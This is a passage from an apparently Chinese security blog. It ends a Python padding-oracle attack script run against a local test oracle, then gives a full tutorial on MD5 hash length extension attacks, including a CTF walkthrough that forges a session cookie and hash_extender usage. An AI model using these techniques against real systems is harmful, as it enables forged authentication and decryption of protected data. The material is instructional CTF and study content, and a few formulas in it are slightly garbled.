string">"Error not find pad!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>mid_lst<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token keyword">def</span> <span class="token function">fake</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plain<span class="token punctuation">,</span> cipher<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> mid<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''伪造        :plain: 要伪造的明文        :last_cipher: 一个密文块        :last_mid:  密文块解密出来的中间值        '''</span>        pad_plain <span class="token operator">=</span> self<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        plain_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        mid <span class="token operator">=</span> mid <span class="token keyword">if</span> mid <span class="token keyword">else</span> self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        cipher <span class="token operator">=</span> <span class="token punctuation">[</span>cipher <span class="token keyword">if</span> cipher <span class="token keyword">else</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token comment"># 从最后开始计算</span>        <span class="token keyword">for</span> plain <span class="token keyword">in</span> plain_lst<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            need_iv <span class="token operator">=</span> <span class="token string">b""</span>            <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                _m <span class="token operator">=</span> mid<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                _p <span class="token operator">=</span> plain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                need_iv <span class="token operator">+=</span> <span class="token punctuation">(</span>_m <span class="token operator">^</span> _p<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>            mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>need_iv<span class="token punctuation">)</span>            cipher<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> need_iv<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''解密'''</span>        <span class="token comment"># 从最后开始计算</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> _idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            line_idx <span class="token operator">=</span> _idx <span class="token operator">-</span> <span class="token number">1</span>            cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span>            <span class="token keyword">if</span> line_idx <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token comment"># 获取上一行密文数据，因为每一行的明文加密之前需要与上一行的密文异或</span>                p_cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token comment"># 如果是第一行，则其与IV异或</span>                p_cipher_line <span class="token operator">=</span> iv            _mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>cipher_line<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> _mid<span class="token punctuation">)</span>            <span class="token keyword">for</span> idx<span class="token punctuation">,</span> _m <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>_mid<span class="token punctuation">)</span><span class="token punctuation">:</span>                plain_chr <span class="token operator">=</span> _m <span class="token operator">^</span> p_cipher_line<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>plain_chr<span class="token punctuation">)</span>        plain <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> p <span class="token keyword">in</span> self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">:</span>            plain <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>        <span class="token keyword">return</span> plain<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 获取密文</span>    iv <span class="token operator">=</span> POA<span class="token punctuation">.</span>IV         <span class="token comment"># 获取初始化向量</span>    poa_atck <span class="token operator">=</span> PaddingOracleAttack<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    new_iv<span class="token punctuation">,</span> new_cipher <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>fake<span class="token punctuation">(</span><span class="token string">b"wo ai beijing tianan men!"</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> padding oracle攻击 </tag>
            
            <tag> web安全中的密码学攻击 </tag>
            
            <tag> 密码学算法安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希长度扩展攻击</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="一、MD5哈希算法"><a href="#一、MD5哈希算法" class="headerlink" title="一、MD5哈希算法"></a>一、MD5哈希算法</h1><h2 id="1-1-MD5简介"><a href="#1-1-MD5简介" class="headerlink" title="1.1 MD5简介"></a>1.1 MD5简介</h2><p>MD5（Message Digest Algorithm 5）是一种广泛使用的加密散列函数，它可以产生一个128位（16字节）的散列值（hash value），通常用一个32位的十六进制字符串表示，且具有不可逆性（即理论上从散列值无法推导出明文）。MD5由Ron Rivest在1991年设计，最初被用来作为一种安全的密码散列算法。它接收任意长度的输入，并产生一个固定长度的输出，这个输出被认为是输入数据的“指纹”。然而，由于后来发现MD5存在安全漏洞，它不再被推荐用于密码存储等安全敏感的应用。尽管如此，MD5仍然被用于一些非安全相关的场合，比如文件完整性检查。</p><h3 id="1-1-1-php-中md5函数的用法示例"><a href="#1-1-1-php-中md5函数的用法示例" class="headerlink" title="1.1.1 php 中md5函数的用法示例"></a>1.1.1 php 中md5函数的用法示例</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">=</span> php5.6 index.php6f8db599de986fab7a21625b7916589c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-1-2-哈希函数与加密函数的区别"><a href="#1-1-2-哈希函数与加密函数的区别" class="headerlink" title="1.1.2 哈希函数与加密函数的区别"></a>1.1.2 哈希函数与加密函数的区别</h3><p>哈希将目标转换为具有相同长度的、不可逆的杂凑字符串；</p><p>加密则是将目标转化为不同长度的、可逆的密文，长度一般随明文增长而增加；</p><h3 id="1-1-3-常见的哈希算法介绍"><a href="#1-1-3-常见的哈希算法介绍" class="headerlink" title="1.1.3 常见的哈希算法介绍"></a>1.1.3 常见的哈希算法介绍</h3><p>当前最常用的哈希算法有<code>MD5</code>、<code>SHA-1</code>、<code>SHA-2（SHA-224、SHA-256、SHA-384，和SHA-512并称为SHA-2）</code>等。</p><h2 id="1-2-md5哈希算法流程详解"><a href="#1-2-md5哈希算法流程详解" class="headerlink" title="1.2 md5哈希算法流程详解"></a>1.2 md5哈希算法流程详解</h2><h3 id="1-2-0-步骤概览"><a href="#1-2-0-步骤概览" class="headerlink" title="1.2.0 步骤概览"></a>1.2.0 步骤概览</h3><p>MD5算法的详细流程可以概括为以下几个步骤：</p><p>1）明文填充</p><p>2）初始化变量</p><p>3）分块处理</p><p>4）循环压缩函数处理</p><p>5）更新寄存器</p><p>6）生成哈希值</p><p>具体的数据处理流程如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.36.49.png" alt="算法数据处理流程概览" style="zoom:80%;"><h3 id="1-2-1-明文填充"><a href="#1-2-1-明文填充" class="headerlink" title="1.2.1 明文填充"></a>1.2.1 明文填充</h3><p>MD5以512bit为分块处理输入信息，每个分块又被分为16*32的子分组，最终输出为4*32的分组，即32为字符串。</p><ul><li>填充</li></ul><p>输入信息的长度(bit)对512求余不等于448时，使用OneAndZeroes对输入信息进行填充使得对512求余448。</p><p>假设对”abc”进行MD5计算，填充步骤：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.32.09.png" alt="明文填充示意图" style="zoom:50%;"><ul><li>记录信息长度</li></ul><p>填充完成后，用64bit存储信息的长度，”abc”共有24bit，即0x18bit，记录的消息长度为：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.33.18.png" alt="长度记录" style="zoom:50%;"><h3 id="1-2-2-初始化变量"><a href="#1-2-2-初始化变量" class="headerlink" title="1.2.2 初始化变量"></a>1.2.2 初始化变量</h3><p>MD5的哈希结果长度为128位，按每32位分成一组共4组。这4组结果是由4个初始值A、B、C、D经过不断演变得到。算法初始化四个32位的寄存器A、B、C、D，这些寄存器同时用于存储中间计算结果</p><p>MD5的官方实现中，A、B、C、D的初始值如下（16进制）：</p><p>A=0x01234567</p><p>B=0x89ABCDEF</p><p>C=0xFEDCBA98</p><p>D=0x76543210</p><h3 id="1-2-3-分块处理"><a href="#1-2-3-分块处理" class="headerlink" title="1.2.3 分块处理"></a>1.2.3 分块处理</h3><p>将填充后的数据按照512位（64字节）一块进行处理，每块包含16个32位字。</p><h3 id="1-2-4-循环压缩函数处理"><a href="#1-2-4-循环压缩函数处理" class="headerlink" title="1.2.4 循环压缩函数处理"></a>1.2.4 循环压缩函数处理</h3><p>对每个512位的数据块进行四轮循环压缩函数处理，每轮处理包括四个步骤：F函数、G函数、H函数和I函数。这些非线性函数在循环压缩函数处理中起着重要作用。</p><p>主要流程是以512位的分块为单位，每一分块经过4轮循环，每轮循环16次迭代，输出128位的结果，存放在缓冲区中，作为下一轮循环缓冲区的输入。</p><p>4轮循环的逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.42.19.png" alt="512bit的数据处理流程" style="zoom:50%;"><p>从缓冲区输入128位，从消息分组输入512位，输出结果128位，要注意结果是由循环的结果加上缓冲区的值得到的(加法为模$2^32$加法)。A，B，C，D就是哈希值的四个分组。每一次循环都会让旧的ABCD产生新的ABCD。一共进行多少次循环呢？由原文长度决定。假设处理后的原文长度是M，主循环次数 = M / 512，每个主循环中包含 （512/32） * 4 = 64 次子循环。上面这张图所表达的是单次子循环的流程。</p><p>每轮循环中单次迭代的逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.59.48.png" alt="单轮循环中的单次迭代逻辑" style="zoom:50%;"><p>每轮循环迭代运算的逻辑：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>对A迭代：a <span class="token operator">&lt;</span>—— <span class="token number">6</span>+<span class="token punctuation">((</span>a+g<span class="token punctuation">(</span>b,c,d<span class="token punctuation">)</span>+X<span class="token punctuation">[</span>k<span class="token punctuation">]</span>+T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;&lt;</span>s<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>缓冲区（A,B,C,D<span class="token punctuation">)</span>作循环轮换：<span class="token punctuation">(</span>B,C,D,A<span class="token punctuation">)</span> <span class="token operator">&lt;</span>——<span class="token punctuation">(</span>A,B,C,D<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>a，b，c，d是缓冲区的当前值</li><li>g是4个轮函数之一，输入输出都是<code>32bit</code>，进行不同的逻辑运算</li><li><code>&lt;&lt;&lt;s</code>（CLS（s））是指把<code>bit32</code>循环左移<code>s</code>位，<code>s</code>可查表得到</li><li><code>X[k]</code>是当前处理消息分组的第<code>k</code>个<code>32bit</code>（一共512/32=16个字），在每一轮循环中都由不同的公式计算出来</li><li><code>T[i]</code>通过查表得到，32bit字</li><li>所有的加法都是模$2^32$加法</li></ul><p>4个轮函数逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2011.05.00.png" alt="4个轮函数" style="zoom:50%;"><p>每轮循环中<code>X[k]</code>所取的<code>k</code>的计算方法为：</p><p>取<code>j</code>为当前迭代轮次</p><ol><li>第一轮循环：<code>k = j</code></li><li>第二轮循环：<code>k = (1 + 5 * j) % 16</code></li><li>第三轮循环：<code>k = (5 + 3 * j) % 16</code></li><li>第四轮循环：<code>k = (7 * j) % 16</code></li></ol><h3 id="1-2-5-更新寄存器"><a href="#1-2-5-更新寄存器" class="headerlink" title="1.2.5 更新寄存器"></a>1.2.5 更新寄存器</h3><p>根据每轮的计算结果更新寄存器A、B、C、D的值。</p><h3 id="1-3-6-生成哈希值"><a href="#1-3-6-生成哈希值" class="headerlink" title="1.3.6 生成哈希值"></a>1.3.6 生成哈希值</h3><p>最后一轮得到的结果经过高低位互换后就是最终的结果。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">6f8db599de986fab7a21625b7916589c<span class="token assign-left variable">A</span><span class="token operator">=</span>0x99b58d6f<span class="token assign-left variable">B</span><span class="token operator">=</span>0xab6f98de<span class="token assign-left variable">C</span><span class="token operator">=</span>0x5b62217a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x9c581679<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A B C D 分别按字节反转后拼接构成最后的哈希值。</p><h1 id="二、哈希长度扩展攻击原理"><a href="#二、哈希长度扩展攻击原理" class="headerlink" title="二、哈希长度扩展攻击原理"></a>二、哈希长度扩展攻击原理</h1><h2 id="2-1-攻击场景"><a href="#2-1-攻击场景" class="headerlink" title="2.1 攻击场景"></a>2.1 攻击场景</h2><h3 id="2-1-1-攻击场景1-文件下载权限验证"><a href="#2-1-1-攻击场景1-文件下载权限验证" class="headerlink" title="2.1.1 攻击场景1-文件下载权限验证"></a>2.1.1 攻击场景1-文件下载权限验证</h3><p>Message Authentication Codes (MACs)是用于验证信息真实性的算法。最简单的MAC算法是这样的：服务器把key和message连接到一起，然后用摘要算法如<code>MD5</code>或<code>SHA1</code>取出摘要。</p><p>例如有一个网站，在用户下载文件之前需验证下载权限。</p><p>这个网站会用如下的算法产生一个关于文件名的MAC：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def Create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>   <span class="token builtin class-name">return</span> Digest::MD5.hexdigest<span class="token punctuation">(</span>key + filename<span class="token punctuation">)</span>end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>key对于攻击者来说是未知的。</p><p>用户请求下载test.pdf文件时提交如下请求：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/download?file<span class="token operator">=</span>test.pdf<span class="token operator">&amp;</span><span class="token assign-left variable">mac</span><span class="token operator">=</span>ca21cf672b66a5ee6fa7fc7c1c314ff3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当用户发起请求要下载一个文件时，会执行下面这个函数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def verify_mac<span class="token punctuation">(</span>key, filename, userMAC<span class="token punctuation">)</span>    validMAC <span class="token operator">=</span> create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>validMAC <span class="token operator">==</span> userMAC<span class="token punctuation">)</span> <span class="token keyword">do</span>        initiateDownload<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span>        displayError<span class="token punctuation">(</span><span class="token punctuation">)</span>    endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端根据key和用户提交的文件名生成一个哈希值，跟用户提交的哈希值做比对，比对成功才会允许下载文件，这种情况下要求文件名和用户提供的mac值都是合法的。</p><p>本意是通过key的保密性来验证身份，因为正常情况下只有服务端和合法客户端才掌握key。</p><p>这样，只有当用户没有擅自更改文件名时服务器才会执行<code>initiateDownload()</code>开始下载。</p><p>但是这种生成MAC的方式，会给攻击者在文件名后添加自定义的字符串留下隐患。 </p><p>这种方法就是哈希长度拓展攻击。</p><p>攻击结果：不知道key、不知道合法文件名，但是能通过验证。</p><h3 id="2-1-2-攻击场景2"><a href="#2-1-2-攻击场景2" class="headerlink" title="2.1.2 攻击场景2"></a>2.1.2 攻击场景2</h3><p>在一道web题目中遇到了以下判断: <code>if ($COOKIE["md5hash"] === md5($secret . $input))</code></p><p>在该题目中我们可以掌握的参数有<code>md5hash</code>、<code>input</code>的值，<code>secret</code>的md5值和长度，我们需要想办法让这个判断通过。</p><p>难点在于：不知道$secret的情况下，传递一个哈希值和input，使得哈希值===md5($secret.$input)。</p><h2 id="2-2-哈希长度扩展攻击简介"><a href="#2-2-哈希长度扩展攻击简介" class="headerlink" title="2.2 哈希长度扩展攻击简介"></a>2.2 哈希长度扩展攻击简介</h2><p>哈希长度扩展攻击（Hash Length Extension Attacks）是一种针对某些加密散列函数的攻击手段，特别适用于那些基于Merkle–Damgård结构的算法，如MD5和SHA-1。这类攻击的核心在于，如果你知道一个消息（message）和密钥（key）的组合的哈希值，即使不知道密钥的具体值，只要知道密钥的长度，你就能在这个消息后面添加额外的信息，并计算出新的哈希值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span><span class="token punctuation">)</span><span class="token operator">=</span>cdf1ea<span class="token punctuation">..</span>md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span>+<span class="token string">"abcdfafa"</span><span class="token punctuation">)</span><span class="token operator">=</span>ade24242<span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>攻击条件：</p><ol><li>﻿﻿消息可控已知</li><li>﻿﻿密钥长度已知</li><li>﻿﻿﻿使用MD5加密且结果可知</li></ol><h2 id="2-3-攻击步骤"><a href="#2-3-攻击步骤" class="headerlink" title="2.3 攻击步骤"></a>2.3 攻击步骤</h2><h3 id="2-3-1-以某CTF赛题为例子"><a href="#2-3-1-以某CTF赛题为例子" class="headerlink" title="2.3.1 以某CTF赛题为例子"></a>2.3.1 以某CTF赛题为例子</h3><ul><li>代码如下：</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2014.21.21.png" alt="CTF赛题实例" style="zoom:50%;"><h3 id="2-3-2-条件分析"><a href="#2-3-2-条件分析" class="headerlink" title="2.3.2 条件分析"></a>2.3.2 条件分析</h3><p>从代码中已知<code>$this-&gt;sess=md5($this-&gt;token.$this-&gt;username)</code>，在不传递任何参数的情况下，<code>$sess</code>为token（20个未知字符）与”admin”组成的字符串的md5值，并且会在cookie中返回。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sess</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从上面的代码可知，$sess和$username的值是用户提交的。</p><p>获取flag的条件是：提交一个伪造的非”admin”的username，并且提交该username与token拼接之后的md5值（也就是$sess），但是由于toekn不为我们所知晓，我们也无从计算出正确的md5值。</p><p>我们目前掌握的信息：</p><p>1）????????????????????admin 的哈希值 （?表示的内容为未知token），记为H1。</p><p>2）未知token的长度为20。</p><p>3）username和sess的值是可控的。</p><h3 id="2-3-3-核心要点"><a href="#2-3-3-核心要点" class="headerlink" title="2.3.3 核心要点"></a>2.3.3 核心要点</h3><p>巧妙利用md5哈希算法的分组运算机制。</p><p>将H1当作某个明文（这个明文我们需要伪造）中的第一个数据块（512bit）的散列值。根据md5算法以每512bit为数据块计算散列值的原理，当计算第二个数据块的散列值时，会以H1作为ABCD寄存器的缓存值。</p><p>我们如果能把字符串扩展到512bit以上，并保证第一段的md5运算结果不改变，那么我们在不知道第一段的加密内容的情况下仍然能够求得整体的md5值。此所谓”扩展”的含义。</p><h3 id="2-3-4-攻击实施"><a href="#2-3-4-攻击实施" class="headerlink" title="2.3.4 攻击实施"></a>2.3.4 攻击实施</h3><h4 id="1）模仿md5算法的填充"><a href="#1）模仿md5算法的填充" class="headerlink" title="1）模仿md5算法的填充"></a>1）模仿md5算法的填充</h4><p>所以我们首先要做的就是”模仿”md5算法的补位方式来进行补位。</p><p>????????????????????admin的长度=20+5=25个byte25*8=200bit</p><p>表示成16进制即为：0xC8=12*16+8=200</p><p>所以填充的结果如下（称为M1）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【????????????????????admin】【8000000<span class="token punctuation">..</span><span class="token punctuation">..</span>000000】【c800000000000000】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>【（????????????????????admin）】为消息内容。</p><p>【8000000….000000】为填充值。</p><p>【c800000000000000】为长度填充。</p><p>如此一来，M1经过md5算法计算的结果，跟md5（????????????????????admin）计算的结果是一致的。我们知识作了md5算法本身就该做的事情。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>M1<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>md5<span class="token punctuation">(</span>????????????????????admin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如前文所述，实际上在本实例中上述值我们是知道的，eg:ae8b63d93b14eadd1adb347c9e26595a（H1）</p><h4 id="2）将已知的H1值作为作为ABCD寄存器的缓存值"><a href="#2）将已知的H1值作为作为ABCD寄存器的缓存值" class="headerlink" title="2）将已知的H1值作为作为ABCD寄存器的缓存值"></a>2）将已知的H1值作为作为ABCD寄存器的缓存值</h4><p>将<code>ae8b63d93b14eadd1adb347c9e26595a</code>分成8字节唯一组的四组，ae8b63d9,3b14eadd,1adb347c,9e26595a</p><p>由于md5是小端存储，进行相应的调整：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">A</span><span class="token operator">=</span>0xd9638bae<span class="token assign-left variable">B</span><span class="token operator">=</span>0xddea143b<span class="token assign-left variable">C</span><span class="token operator">=</span>0x7c34db1a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x5a59269e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3）拼接第二段内容"><a href="#3）拼接第二段内容" class="headerlink" title="3）拼接第二段内容"></a>3）拼接第二段内容</h4><p>M1+fakeadmin</p><p>将我们求出来的ABCD序列作为初始序列，利用md5算法对<code>fakeadmin</code>这个字符串进行md5加密。得到md5值：</p><p>比如是：bdbe1c6fb9d921e4ba3d9d4072b702f7（H2）</p><p>这个H2===md5(M1+fakeadmin)</p><h3 id="2-3-5-修改cookie获取flag"><a href="#2-3-5-修改cookie获取flag" class="headerlink" title="2.3.5 修改cookie获取flag"></a>2.3.5 修改cookie获取flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">username</span><span class="token operator">=</span>M1+fakeadmin<span class="token assign-left variable">session</span><span class="token operator">=</span>bdbe1c6fb9d921e4ba3d9d4072b702f7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三、攻击工具"><a href="#三、攻击工具" class="headerlink" title="三、攻击工具"></a>三、攻击工具</h1><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a> 【hash_extender】</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-d</span> 被扩展的明文<span class="token parameter variable">-a</span> 附加的到原来hash的padding<span class="token parameter variable">-l</span> 盐的长度<span class="token parameter variable">-f</span> 加密方式<span class="token parameter variable">-s</span> 带盐加密的hash值--out-data-format 输出格式<span class="token 